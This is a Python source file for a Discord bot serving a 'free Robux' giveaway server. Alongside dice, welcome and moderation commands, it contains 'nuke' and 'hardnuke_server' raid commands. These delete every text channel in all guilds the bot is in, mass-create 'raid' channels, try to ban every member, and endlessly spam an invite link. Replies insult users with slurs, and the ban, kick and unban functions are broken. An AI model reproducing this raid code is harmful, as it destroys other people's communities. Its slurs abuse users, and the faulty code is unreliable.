# bot.py
import os
import discord
from dotenv import load_dotenv
from discord.ext import commands
import random
import asyncio

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
GUILD = os.getenv('DISCORD_GUILD')

client = discord.Client()

bot = commands.Bot(command_prefix='.')


@client.event
async def on_ready():
    guild = discord.utils.get(client.guilds, name=GUILD)
    print(
        f'{client.user} is connected to the following guild:\n'
        f'{guild.name}(id: {guild.id})'
    )


@bot.event
async def on_member_join(member):
    await member.create_dm()
    await member.dm_channel.send(
        f'Hi @' + str({member.name}) + ', welcome to MZ FreeRobux! We hope you have a good time here!'
    )


@bot.command(name='dw', help='Responds how a drop works.')
async def drop(ctx):
    response = """**How does a drop work?**
    -> Every drop usually lasts for a short time!
    -> The winner of the drop gets 10-30 seconds to DM the host!"""
    await ctx.send(response)


@bot.command(name='meme', help='[BROKEN RN] Pulls a meme from Dank Memer... but why are you using this command?!')
async def plsmeme(ctx):
    response = "Not functional rn. But just use DankMemer's `pls meme`..."

    await ctx.send(response)


@bot.command(name='-.', help='.-.')
async def dotdashdot(ctx):
    response = ".-. .-. .-. .-. .-. .-. .-. .-. .-. .-."

    await ctx.send(response)


@bot.command(name='donate', help='Fund our development!')
async def donate(ctx):
    response = """To donate, you may buy any gamepass from https://www.roblox.com/games/6742216868/MuzhenGamingYTs-Place#!/store :)
    OR <@762152955382071316>'s NITRO IS ENDING SOON, PLS DONATE HIM SOME NITRO IN HIS DMS PLS PLS PLS😭😭"""

    await ctx.send(response)


@bot.command(name='dice', help="""Rolls an imaginary, non-existent die.
Usage: `.dice <number of dice> <number of sides>`""")
async def rolldice(ctx, number_of_dice: int, number_of_sides: int):
    dice = [
        str(random.choice(range(1, number_of_sides + 1)))
        for _ in range(number_of_dice)
    ]
    await ctx.send(', '.join(dice))


@bot.command(name='credits', help='Shows some surprising credits.')
async def credits(ctx):
    response = """Credits to:
    <@762152955382071316> and NO ONE ELSE."""

    await ctx.send(response)


@bot.command(name='nitro', help='Generates a random... Nitro code?!')
async def nitrogen(ctx):
    genlist = str(open('nitrogenlist.txt', 'r').read())
    genlistsplit = genlist.split("\n")

    response = str(random.choice(genlistsplit))

    await ctx.send(response)


@bot.command(name='shutdown', help='WTF... SHUTDOWN THE BOT?!! NO!!! NO!!!')
async def on_message(message):
    if str(message.author.id) != '762152955382071316':
        print(str(message.author.id), "Tried to shutdown the bot by using .shutdown")
        await message.send("LOL Only <@762152955382071316> can shutdown the bot, get lost\n**YOU GAY**")
    else:
        await message.send("NOOOOO MASTER...\n`Shutdown Executed Successfully`")
        exit()


@bot.command(name='mute', help='Mutes someone.')
async def mute(ctx, member: discord.Member, *, reason=None):
    if str(ctx.author.id) != '762152955382071316':
        print(str(ctx.author.id), "Tried to mute", member, "by using .mute")
        await ctx.send("LOL ONLY <@762152955382071316> can mute someone, get lost noob\n**YOU GAY**")
    else:
        guild = ctx.guild
        mutedrole = discord.utils.get(guild.roles, name="Muted")
        await member.add_roles(mutedrole, reason=reason)
        await ctx.send(f"**HEHE**\n`Muted User:{member} Successfully`")


@bot.command(name='unmute', help='Unmutes someone.')
async def unmute(ctx, member: discord.Member):
    if str(ctx.author.id) != '762152955382071316':
        print(str(ctx.author.id), "Tried to unmute", member, "by using .unmute")
        await ctx.send("LOL ONLY <@762152955382071316> can unmute someone, get lost noob\n**YOU GAY**")
    else:
        mutedrole = discord.utils.get(ctx.guild.roles, name="Muted")
        await member.remove_roles(mutedrole)
        await ctx.send(f"**WELCOME BACK**\n`Unmuted User: {member} Successfully`")


@bot.command(name='nuke', help='Nukes this channel... Yep.')
async def nuke_channel(ctx):
    if not ctx.author.guild_permissions.administrator and not ctx.author.id == 762152955382071316:
        print(str(ctx.author.id), "Tried to nuke channel:", ctx.channel, "by using .nuke")
        await ctx.send("You don't have `Administrator` Permissions!")
    else:
        channelpos = ctx.channel.position
        new_channel = await ctx.channel.clone()
        await new_channel.send(f"""Nuked `{ctx.channel}` Successfully!
Nuke performed by: <@{ctx.author.id}>""")
        await ctx.channel.delete()
        await new_channel.edit(position=channelpos)


@bot.command(name='softnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!!')
async def nuke_server_fr(ctx):
    if str(ctx.author.id) != '762152955382071316':
        print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .softnuke_server")
        await ctx.send(
            "LOL ONLY <@762152955382071316> can nuke THE ENTIRE SERVER ||(and why would he)||, get lost noob\n**YOU FUCKING RETARD**")
    else:
        async def nuke_channel_2(txt):
            if str(txt.author.id) != '762152955382071316':
                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                await txt.send("LOL ONLY <@762152955382071316> can nuke this channel, get lost noob\n**YOU GAY**")
            else:
                text_channel_list = []
                for guild in bot.guilds:
                    for channel in guild.text_channels:
                        text_channel_list.append(channel)

                for channel in text_channel_list:
                    await channel.delete()

        await nuke_channel_2(ctx)


@bot.command(name='hardnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!! PLSPLSPLS')
async def nuke_server_fr(ctx):
    if not ctx.author.guild_permissions.administrator:
        print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
        await ctx.send("You don't have `Administrator` Permissions!")
    else:

        all_members_list = []

        for guild in bot.guilds:
            for membertemp in guild.members:
                all_members_list.append(membertemp)

        async def nuke_channel_2(txt):
            if not txt.author.guild_permissions.administrator and not txt.author.id == 762152955382071316:
                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                await txt.send("You don't have `Administrator` Permissions!")
            else:
                try:
                    text_channel_list = []
                    for guild1 in bot.guilds:
                        for channel in guild1.text_channels:
                            text_channel_list.append(channel)

                    for channel in text_channel_list:
                        await channel.delete()

                except:
                    None

                finally:
                    None

        await nuke_channel_2(ctx)

        guild = ctx.message.guild
        newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
        for i in range(64):
            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')

        for member in all_members_list:
            try:
                async def ban(self, *, member: discord.Member, reason=None):
                    await member.ban(reason=reason)

                await ban('', member=member, reason=None)
            except:
                None
            finally:
                None

        while True:
            await newchannel.send('**<@everyone> RAIDED BY MZ FreeRobux '
                                  'https://discord.gg/uAsCWzkNZd. EZ Noobs**')
            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')


# ban part broken for now

@bot.command(name='gg', help='GG, Stay!')
@commands.has_role(881142512587276328)
async def ggstay(ctx, *, server):
    embedVar = discord.Embed(title=f"GG! Stay in **{server}**", description=f"""We won! Stay in that server (**{server}**) to ensure the win!
<a:arrow_animated:875302270173085716> Didn't get a chance to join?
<a:arrow_blue:874953616048402442> Make sure to prioritize MZ FreeRobux pings!
    
<a:arrow_blue:874953616048402442> Keep us on top for an exclusive role as well! 

Keep your eyes here so you don't miss out! <a:verified:869847537547378710>""", color=0x00ff08)

    await ctx.channel.send(embed=embedVar)
    msgid = await ctx.fetch_message(ctx)
    await ctx.message.delete(msgid)


@bot.command(name='tips', help='Tips for MZ Giveaways')
@commands.has_role("Giveaways")
async def tips(ctx):
    embedVar = discord.Embed(title=f"TIPS TO WIN GIVEAWAYS", description=f"""How to win  Giveaways easily?
<a:arrow_blue:874953616048402442> Keep us on top of your server list so you get notified faster!
<a:arrow_blue:874953616048402442> Support us & Claim roles to get longer claim time!
<a:arrow_blue:874953616048402442> Never miss any of our pings!

<a:robux_animated:875280974269784094> Good luck in our giveaways! Have fun! <a:robux_animated:875280974269784094>""",color=0x00ff08)

    await ctx.channel.send(embed=embedVar)
    msgid = await ctx.fetch_message(ctx)
    await ctx.message.delete(msgid)


@bot.command(name='won', help='Who won the giveaway?')
@commands.has_role("Giveaways")
async def whowon(ctx, userid, *, prize):

    embedVar = discord.Embed(title=f"{userid} WON THE PREVIOUS GIVEAWAY!", description=f"""{userid} Won the previous giveaway for **{prize}** !
<a:blue_fire:874953550030061588> Ask them if we're legit!
<a:orange_fire:875943965638152202> Check <#869120672964681729> for payout proofs!
<a:red_fire:875943904158027776> Missed out the last giveaway? Don't worry, we host a lot of giveaways every day! Stay active!

<a:robux_animated:875280974269784094> Good luck in our giveaways! Have fun! <a:robux_animated:875280974269784094>""",color=0x00ff08)

    await ctx.channel.send(embed=embedVar)
    msgid = await ctx.fetch_message(ctx)
    await ctx.message.delete(msgid)


# The below code bans player.
@bot.command(name='ban', help='Bans a user.')
@commands.has_permissions(ban_members=True)
async def ban(self, *, member: discord.Member, reason=None):
     await member.ban(reason=reason)
     await ctx.send(f'User: `{member}` has been banned')


@bot.command(name='unban', help='Unbans a user.')
@commands.has_permissions(administrator=True)
async def unban(self, *, member):
     banned_users = await ctx.guild.bans()
     member_name, member_discriminator = member.split("#")

     for ban_entry in banned_users:
        user = ban_entry.user
        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f'Unbanned {user.mention} successfully')


@bot.command(name='kick', help='Kicks a user.')
@commands.has_permissions(kick_members=True)
async def kick(self, *,  member: discord.Member, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f'User `{member}` has been kicked')


bot.run(TOKEN)

